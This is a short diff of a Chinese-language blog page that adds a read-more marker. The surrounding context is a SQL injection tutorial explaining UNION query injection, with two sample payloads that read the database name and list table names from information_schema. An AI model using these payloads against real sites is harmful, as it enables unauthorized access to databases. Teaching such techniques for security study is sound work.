@@ -169,6 +169,7 @@
 # 3. 未过滤特殊字符
 # 4. sql错误回显
 </code></pre>
+<span id="more"></span>
 <h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><h2 id="UNION-query-SQL-injection（联合查询注入）"><a href="#UNION-query-SQL-injection（联合查询注入）" class="headerlink" title="UNION query SQL injection（联合查询注入）"></a>UNION query SQL injection（联合查询注入）</h2><pre><code>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化，有注入点时页面会根据输入的数据变化而变化，当存在注入点时，优先考虑使用联合注入手法。
 ?id=-1&#39; union select 1,2,database() --+`==`
 ?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+`==`
